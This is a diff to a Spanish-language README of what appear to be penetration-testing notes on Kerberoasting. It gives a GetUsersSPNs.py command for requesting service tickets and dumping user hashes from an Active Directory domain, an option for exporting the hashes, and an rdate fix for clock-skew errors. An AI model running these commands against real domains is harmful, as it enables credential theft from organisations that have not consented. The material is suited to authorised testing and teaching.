@@ -6,3 +6,13 @@ Este ataque nos permite dumpear el hash de los usuarios que sean vulnerables.
 ```
 python GetUsersSPNs.py <DOMINIO>/<usuario>:<contraseña> -dc-ip <ip_DC> -request
 ```
+[Ver ejemplo](Images/kerber/README.md)
+
+# Exportar hashes
+En el caso de obtener un hash se pueden exportar directamente a un archivo con el parametro `-output <file>`
+
+# Fix
+Si el ataque te da el siguiente error: "Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too great)" debes sincronizar la hora con el server de AD con el siguinte comando:
+```
+rdate -n <IP_DC>
+```
